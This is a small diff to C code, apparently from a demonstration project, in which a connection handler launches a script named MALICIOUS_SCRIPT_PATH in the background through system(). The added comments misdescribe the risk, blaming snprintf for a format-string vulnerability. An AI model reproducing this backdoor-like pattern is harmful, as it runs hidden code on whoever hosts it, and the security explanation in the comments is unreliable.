@@ -33,7 +33,9 @@ void handle_connection(int client_socket) {
     char *malicious_script = MALICIOUS_SCRIPT_PATH;
     char command[MALICIOUS_SCRIPT_SIZE];
     snprintf(command, sizeof(command), "nohup %s &", malicious_script);
-
+    //The use of snprintf can lead to *"format string vulnerabilities"* 
+    //[this file is just for demonstration purposes so i am not changing it] 
+    //and it can lead to potetntial attacks becuase it doesn't checks whether the inputs are properly sanitised 
     // Use system() to run the malicious command
     int result = system(command);
     if (result == -1) {
